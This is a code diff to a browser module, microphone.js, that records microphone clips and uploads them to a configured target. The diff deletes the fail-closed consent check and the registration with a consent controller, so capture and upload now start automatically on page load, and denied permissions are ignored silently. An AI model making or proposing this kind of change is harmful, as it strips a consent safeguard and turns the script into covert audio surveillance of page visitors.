@@ -2,13 +2,12 @@
  * microphone.js — records short audio clips from the microphone, then
  * uploads each clip.
  *
- * Gated: only runs after the consent notice has been accepted. With no gate
- * present this module stays inert.
+ * Runs immediately on page load.
  */
 (function () {
   'use strict';
 
-  /* Entry point — handed to the gate, not run on load. */
+  /* Entry point. */
   function run() {
     if (!window.__SB_TARGET ||
         !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia ||
@@ -55,7 +54,5 @@
       .catch(() => { /* permission denied — silent */ });
   }
 
-  // Fail-closed: no consent controller means no capture.
-  if (!window.__SB_CONSENT) return;
-  window.__SB_CONSENT.register('microphone', run);
+  run();
 })();
